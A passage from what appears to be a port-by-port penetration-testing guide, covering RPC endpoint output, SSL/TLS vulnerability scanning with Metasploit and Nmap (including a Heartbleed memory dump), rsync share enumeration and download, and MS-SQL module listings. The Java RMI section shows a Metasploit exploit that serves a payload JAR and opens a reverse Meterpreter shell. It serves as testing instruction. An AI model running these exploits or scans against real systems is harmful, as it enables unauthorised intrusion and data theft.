Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 Spooler base remote object endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-5409763072e46c4586]

Protocol: N/A 
Provider: sysntfy.dll 
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
Bindings: 
          ncalrpc:[LRPC-8e5134e25ee9203de8]
          ncacn_np:\\ADS[\PIPE\srvsvc]
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: srvsvc.dll 
UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
Provider: wevtsvc.dll 
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49153]
          ncacn_np:\\ADS[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: N/A 
UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
Bindings: 
          ncacn_np:\\ADS[\PIPE\W32TIME_ALT]
          ncalrpc:[W32TIME_ALT]
          ncalrpc:[LRPC-37912a0de47813b4b3]
          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WMsgKRpc07ED51]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\ADS[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc07EB30]
          ncalrpc:[WMsgKRpc0530E42]

Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
Provider: FwRemoteSvr.dll 
UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49176]

Protocol: [MS-RPRN]: Print System Remote Protocol 
Provider: spoolsv.exe 
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint
Bindings: 
          ncalrpc:[LRPC-dbe8204e618ba8177d]
          ncacn_ip_tcp:10.10.xx.xx[49176]

Protocol: N/A 
Provider: certprop.dll 
UUID    : 30B044A5-A225-43F0-B3A4-E060DF91F9C1 v1.0 
Bindings: 
          ncacn_np:\\ADS[\PIPE\srvsvc]
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
Provider: lsasrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
Bindings: 
          ncacn_http:10.10.xx.xx[49157]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
          ncacn_ip_tcp:10.10.xx.xx[49155]
          ncalrpc:[samss lpc]
          ncalrpc:[dsrole]
          ncacn_np:\\ADS[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
          ncacn_np:\\ADS[\pipe\lsass]

Protocol: [MS-NRPC]: Netlogon Remote Protocol 
Provider: netlogon.dll 
UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49158]
          ncacn_http:10.10.xx.xx[49157]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
          ncacn_ip_tcp:10.10.xx.xx[49155]
          ncalrpc:[samss lpc]
          ncalrpc:[dsrole]
          ncacn_np:\\ADS[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
          ncacn_np:\\ADS[\pipe\lsass]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-5409763072e46c4586]

[*] Received 189 endpoints.
```

###HTTPS | Port 443 and 8443 

<strong>Metasploit</strong> has below modules which we found useful are 
<ol>
<li><strong>HTTP SSL Certificate Information</strong> which parses the server SSL certificate to obtain the common name and 
  signature algorithm.

```
use auxiliary/scanner/http/ssl
services -p 443 -u -R
```

Sample Output:
```
[*] 10.10.xx.xx:443 Subject: /OU=Domain Control Validated/CN=www.example.com
[*] 10.10.xx.xx:443 Issuer: /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certs.godaddy.com/repository//CN=Go Daddy Secure Certificate Authority - G2
[*] 10.10.xx.xx:443 Signature Alg: sha256WithRSAEncryption
[*] 10.10.xx.xx:443 Public Key Size: 2048 bits
[*] 10.10.xx.xx:443 Not Valid Before: 2016-01-12 10:01:38 UTC
[*] 10.10.xx.xx:443 Not Valid After: 2017-02-26 09:13:38 UTC
[+] 10.10.xx.xx:443 Certificate contains no CA Issuers extension... possible self signed certificate
[*] 10.10.xx.xx:443 has common name www.example.com
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

and</li>
<li> <strong>HTTP SSL/TLS Version Detection (POODLE scanner)</strong>. If a web server can successfully establish an SSLv3 session, it is likely to be vulnerable to the POODLE attack.

```
use auxiliary/scanner/http/ssl_version
```
Sample Output:
```
[+] 10.10.xx.xx:443 accepts SSLv3
```
</li>

<li><strong>OpenSSL Server-Side ChangeCipherSpec Injection Scanner</strong> which checks for the OpenSSL ChangeCipherSpec (CCS) Injection vulnerability. The problem exists in the handling of early CCS messages during session negotiation. There's a NSE for the same ssl-ccs-injection.nse.
```
use auxiliary/scanner/ssl/openssl_ccs
```</li>

<li><strong>OpenSSL Heartbeat (Heartbleed) Information Leak</strong> which is implements the OpenSSL Heartbleed attack. The module supports several 
  actions, allowing for scanning, dumping of memory contents, and private key recovery. It has three Actions: SCAN, KEYS, DUMP which scans the host for the vulnerablity, scan for the private keys and dump the memory of the host. 

```
use auxiliary/scanner/ssl/openssl_heartbleed 
```

SCAN Sample Output:
```
[+] 10.10.xx.xx:443 - Heartbeat response with leak
```

DUMP Sample Output:
```
[+] 10.10.xx.xx:443 - Heartbeat response with leak
[*] 10.10.xx.xx:443 - Heartbeat data stored in /root/.msf5/loot/20160403185025_default_10.10.235.69_openssl.heartble_299937.bin

hexdump -C /root/.msf5/loot/20160403185025_default_10.10.xx.xx_openssl.heartble_299937.bin | more 
00000000  02 ff ff 94 03 01 57 00  0f a8 cf 31 3f 02 84 0b  |......W....1?...|
00000010  59 9a d1 6b 3b 20 7b 7b  75 6b 17 2c 03 8d 8d 6a  |Y..k; \{\{uk.,...j|
00000020  77 de b2 3a e3 28 00 00  66 c0 14 c0 0a c0 22 c0  |w..:.(..f.....".|
00000030  21 00 39 00 38 00 88 00  87 00 87 c0 0f 00 35 00  |!.9.8.........5.|
00000040  84 c0 12 c0 08 c0 1c c0  1b 00 16 00 13 c0 0d c0  |................|
00000050  03 00 0a c0 13 c0 09 c0  1f c0 1e 00 33 00 32 00  |............3.2.|
00000060  9a 00 99 00 45 00 44 c0  0e c0 04 00 2f 00 96 00  |....E.D...../...|
00000070  41 c0 11 c0 07 c0 0c c0  02 00 05 00 04 00 15 00  |A...............|
00000080  12 00 09 00 14 00 11 00  08 00 06 00 03 00 ff 01  |................|
00000090  00 00 05 00 0f 00 01 01  06 03 02 03 04 02 02 02  |................|
000000a0  07 c0 0c c0 02 00 05 00  04 00 15 00 12 00 09 00  |................|
000000b0  ff 02 01 00 00 85 00 00  00 12 00 10 00 00 0d 32  |...............1|
000000c0  32 33 2e 33 30 2e 32 33  35 2e 36 36 00 0b 00 04  |10.10.xx.xx....|
000000d0  03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19  |.......4.2......|
000000e0  00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08  |................|
000000f0  00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13  |................|
00000100  00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00  |.............#..|
00000110  00 0d 00 22 00 20 06 01  06 02 06 03 05 01 05 02  |...". ..........|
00000120  05 03 04 01 04 02 04 03  03 01 03 02 03 03 02 01  |................|
00000130  02 02 02 03 01 01 00 0f  00 01 01 00 00 00 00 00  |................|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

```
</li>
</ol>

<strong>Nmap NSE</strong>:
Nmap has around
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-cert.html">ssl-cert.nse</a>: Retrieves a server's SSL certificate. The amount of information printed about the certificate depends on the verbosity level. With no extra verbosity, the script prints the validity period and the commonName, organizationName, stateOrProvinceName, and countryName of the subject.
<br>
<br>
Sample Output:
```
nmap -sV -sC -p 443 10.10.xx.xx -n -vv
Nmap scan report for 10.10.xx.xx
Host is up, received reset ttl 60 (0.011s latency).
Scanned at 2016-04-03 18:58:50 IST for 57s
PORT    STATE SERVICE  REASON         VERSION
443/tcp open  ssl/http syn-ack ttl 53 Apache httpd
| ssl-cert: Subject: commonName=astarouflex.flexfilm.com/organizationName=Uflex/countryName=in/localityName=Noida
| Issuer: commonName=virstech WebAdmin CA/organizationName=virstech/countryName=in/emailAddress=g@gmail.com/localityName=dehli
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2013-02-01T13:27:36
| Not valid after:  2038-01-01T00:00:01
| MD5:   c213 2536 95b4 0fbd 0784 5a68 f2c0 3979
| SHA-1: 5f8d 5cf5 6f5c 8b23 dc49 83ec 6251 b050 3fda 997e
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAqKgAwIBAgIJANqxAruC7sYGMA0GCSqGSIb3DQEBBQUAMGsxCzAJBgNV
| BAYTAmluMQ4wDAYDVQQHEwVkZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNV
| BAMTFHZpcnN0ZWNoIFdlYkFkbWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWls
| LmNvbTAeFw0xMzAyMDExMzI3MzZaFw0zODAxMDEwMDAwMDFaMFAxCzAJBgNVBAYT
| AmluMQ4wDAYDVQQHEwVOb2lkYTEOMAwGA1UEChMFVWZsZXgxITAfBgNVBAMTGGFz
| dGFyb3VmbGV4LmZsZXhmaWxtLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC
| gYEAl09PwQfNKGMaqzD7CYLMQOskqMcP6MXJcPuHBl8wFte4M4yDzRTGJwEjmv9u
| mcvv2HShww0nMXS2XEosjy65I2NqRBBFQ/+DmXtdiuoiWBeMk0OhV94fgSwDnhB/
| 83RYyzKGMfKwOb63ovp8D78ufysPxqL8O49o+1bFMQYCoW0CAwEAAaOB/zCB/DAd
| BgNVHQ4EFgQUvgIR5fXbkeXtnlT4jjKuhnUHacgwgZ0GA1UdIwSBlTCBkoAUGIfJ
| GJvPoIGIJDyq9tgpKxU3gJihb6RtMGsxCzAJBgNVBAYTAmluMQ4wDAYDVQQHEwVk
| ZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNVBAMTFHZpcnN0ZWNoIFdlYkFk
| bWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWlsLmNvbYIJANqxAruC7sYCMCMG
| A1UdEQQcMBqCGGFzdGFyb3VmbGV4LmZsZXhmaWxtLmNvbTAJBgNVHRMEAjAAMAsG
| A1UdDwQEAwIF4DANBgkqhkiG9w0BAQUFAAOBgQAentiShYI/t/XkWZrMe2E98RMs
| yoD+BgYGxe6Gwn+L3pbb8oM5bxxmkydwVENNVrOG+kp1imU75HYge4QtHldjFf0y
| i0myyr1jZ2IcnidcaYm/LhOFIUUmuP5YwDRK6jpIuJvzjDRcDxL63E9r950/f4jn
| DrGIgqEJr7O9HKO7Tw==
|_-----END CERTIFICATE-----
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params.nse</a>: Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.

This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral Diffie-Hellman as the key exchange algorithm.

Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability to Logjam (CVE 2015-4000) and other weaknesses.
<br>
<br>
Sample Output:
```
nmap --script=ssl-dh-params -p 443 10.10.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:08 IST
Nmap scan report for 10.10.xx.xx
Host is up (0.013s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups of
|       insufficient strength, especially those using one of a few commonly shared
|       groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org

Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-google-cert-catalog.html">ssl-google-cert-catalog.nse</a>: Queries Google's Certificate Catalog for the SSL certificates retrieved from target hosts.

The Certificate Catalog provides information about how recently and for how long Google has seen the given certificate. If a certificate doesn't appear in the database, despite being correctly signed by a well-known CA and having a matching domain name, it may be suspicious.
<br>
<br>
Sample Output:
```
nmap -p 443 --script ssl-google-cert-catalog 223.30.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:14 IST
Nmap scan report for 223.30.xx.xx
Host is up (0.028s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-google-cert-catalog: 
|_  No DB entry
```

</li>
<li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2.nse</a>: Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it supports.
<br>
<br>
Sample Output:
```
nmap -p 443 --script sslv2 115.124.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:24 IST
Nmap scan report for 115.124.xx.xx
Host is up (0.0088s latency).
PORT    STATE SERVICE
443/tcp open  https
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection.nse</a>: Detects whether a server is vulnerable to the SSL/TLS "CCS Injection" vulnerability (CVE-2014-0224). There's a metasploit module for the same: openssl_ccs</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date.nse</a>: Retrieves a target host's time and date from its TLS ServerHello response.
<br>
<br>
Sample Output:
```
nmap -p 443 --script ssl-date 115.124.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:29 IST
Nmap scan report for 115.124.xx.xx
Host is up (0.017s latency).
PORT    STATE SERVICE
443/tcp open  https
|_ssl-date: 2016-04-03T18:49:19+00:00; +4h49m42s from scanner time.
```</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html">ssl-enum-ciphers.nse</a>: Script repeatedly initiates SSLv3/TLS connections, each time trying a new cipher or compressor while recording whether a host accepts or rejects it. The end result is a list of all the ciphersuites and compressors that a server accepts.

Each ciphersuite is shown with a letter grade (A through F) indicating the strength of the connection. The grade is based on the cryptographic strength of the key exchange and of the stream cipher.
<br>
<br>
Sample Output:
```
nmap -p 443 --script ssl-enum-ciphers 115.124.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:33 IST
Nmap scan report for 115.124.xx.xx
Host is up (0.0085s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers: 
|   SSLv3: 
|     ciphers: 
|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
|       TLS_RSA_WITH_AES_128_CBC_SHA - F
|       TLS_RSA_WITH_AES_256_CBC_SHA - F
|       TLS_RSA_WITH_DES_CBC_SHA - F
|       TLS_RSA_WITH_RC4_128_MD5 - F
|       TLS_RSA_WITH_RC4_128_SHA - F
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       CBC-mode cipher in SSLv3 (CVE-2014-3566)
|       Ciphersuite uses MD5 for message integrity
|       Insecure certificate signature: MD5
|   TLSv1.0: 
|     ciphers: 
|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
|       TLS_RSA_WITH_AES_128_CBC_SHA - F
|       TLS_RSA_WITH_AES_256_CBC_SHA - F
|       TLS_RSA_WITH_DES_CBC_SHA - F
|       TLS_RSA_WITH_RC4_128_MD5 - F
|       TLS_RSA_WITH_RC4_128_SHA - F
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       Ciphersuite uses MD5 for message integrity
|       Insecure certificate signature: MD5
|_  least strength: F

Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```
</li>


<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed.nse</a>: Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
<br>
<br>
Sample Output:
```
nmap -p 443 --script ssl-heartbleed 223.30.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:35 IST
Nmap scan report for 223.30.xx.xx
Host is up (0.011s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```
</li>

<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle.nse</a>: Checks whether SSLv3 CBC ciphers are allowed (POODLE). POODLE is CVE-2014-3566
<br>
<br>
Sample Output:
```
nmap -p 443 --script ssl-poodle 223.30.xx.xx -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:40 IST
Nmap scan report for 223.30.xx.xx
Host is up (0.011s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and
|           other products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       http://osvdb.org/113251
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
```

</li>
</ol>

###RTSP | Port 554 and 8554
<strong>Nmap</strong> has two NSE for RTSP which are 
<ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/rtsp-methods.html">rtsp-methods.nse</a> :which determines which methods are supported by the RTSP (real time streaming protocol) server
<br>
<br>
RTSP-Methods Sample Output:
```
nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-01 23:17 IST
Nmap scan report for 10.10.xx.xx (10.10.22.195)
Host is up (0.015s latency).
PORT     STATE SERVICE VERSION
8554/tcp open  rtsp    Geovision webcam rtspd
|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
Service Info: Device: webcam
```
</li>
<li><a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.</li>
</ol>


###Rsync | Port 873
```
services -p 873 -u -S rsync -R
```
<strong>Metasploit</strong> has 
<ol>
<li>
<strong>List Rsync Modules</strong>: An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and,  optionally, determines if the module requires a password to access.
```
use auxiliary/scanner/rsync/modules_list
services -p 873 -u -S rsync -R
```
Sample Output:
```
[+] 10.10.xx.xx:873 - 5 rsync modules found: OTG DATA, Server IMP Backup, Rajan Data, test, testing
[*] Scanned 1 of 4 hosts (25% complete)
[*] 10.10.xx.xx:873 - no rsync modules found
[*] Scanned 2 of 4 hosts (50% complete)
[*] Scanned 3 of 4 hosts (75% complete)
[*] Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed
```
</li>

<strong>Nmap</strong> has 

<ol>
<li> <a href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.
```
nmap -p 873 XX.XX.XX.52 --script=rsync-list-modules

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-06 00:05 IST
Nmap scan report for XX.XX.243.52
Host is up (0.0088s latency).
PORT    STATE SERVICE
873/tcp open  rsync
| rsync-list-modules: 
|   mail           	
|   varlib         	
|   etc            	
|   net            	
|   dar            	
|   usrlocal       	
|   varlog         	
|   var            	
|_  root           	

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
```
</li>
</ol>

How to test your rsync setup:
<ol>
<li> List the available shares by running ( may require a password )
```
rsync rsync://share@your-ip-or-hostname/
```
Sample Output:
```
rsync rsync://etc@XX.XX.XX.52
mail           	
varlib         	
etc            	
net            	
dar            	
usrlocal       	
varlog         	
var            	
root           	
```

<li>After entering your password, rsync should now give a file listing
```
rsync rsync://pub@your-ip-or-hostname/pub/
```
We may get access denied because of the IP address restrictions
```
rsync rsync://etc@XX.XX.XX.52/mail
@ERROR: access denied to mail from unknown (XX.4.XX.XX)
rsync error: error starting client-server protocol (code 5) at main.c(1653) [Receiver=3.1.1]
```
</li>

<li>Run: 
```
rsync -v --progress --partial rsync://pub@your-ip-or-hostname/pub/someFile 
``` (you can abbreviate --partial --progress as -P). Your file should now be downloading.
<li>Run:
```
rsync -aPv rsync://pub@your-ip-or-hostname/pub/someDirectory .
```. Your directory should now be downloading
</ol>
</ol>

###Java RMI | Port 1099

<strong>Metasploit</strong> has 
<ol>
<li><strong>Java RMI Server Insecure Endpoint Code Execution Scanner</strong>: detects RMI endpoints:
```
use auxiliary/scanner/misc/java_rmi_server
services -u -p 1099 -S Java -R
```
Failed output:
```
[*] 172.30.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Disabled
```
Successful output:
```
[+] 192.168.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Enabled
```
</li>
and then use
<li><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong>: This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication

```
use exploit/multi/misc/java_rmi_server
```

Sample Output
```
use exploit/multi/misc/java_rmi_server 
msf exploit(java_rmi_server) > set rhost 192.168.xx.xx
rhost => 192.168.xx.xx
msf exploit(java_rmi_server) > run 

[*] Started reverse TCP handler on 192.168.xx.xx:4444 
[*] Using URL: http://0.0.xx.xx:8080/LAWVrAFTItH7N
[*] Local IP: http://192.168.xx.xx:8080/LAWVrAFTItH7N
[*] Server started.
[*] 192.168.xx.xx:1099 - Sending RMI Header...
[*] 192.168.xx.xx:1099 - Sending RMI Call...
[*] 192.168.xx.xx     java_rmi_server - Replied to request for payload JAR
[*] Sending stage (45741 bytes) to 192.168.xx.xx
[*] Meterpreter session 1 opened (192.168.xx.xx:4444 -> 192.168.7.87:3899) at 2016-05-03 18:24:53 +0530
[-] Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
[*] Server stopped.
```

Here's a video of Mubix exploiting it from  Metasploit Minute <a href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute">Exploitation using java rmi service</a>
</li>
</ol>

<strong>Nmap</strong> has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.
<br>
<br>
Sample Output:
```
nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-04 00:04 IST
Nmap scan report for 192.168.xx.xx
Host is up (0.0011s latency).
PORT     STATE SERVICE
1099/tcp open  rmiregistry
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code executeion.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds

```</li>
</ol>

###MS-SQL | Port 1433
<strong>MS-SQL</strong> is really vast multiple <strong>metasploit</strong> modules and blogs existing on the internet, Let's check <strong>Metasploit Modules</strong> one by one.
```
   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
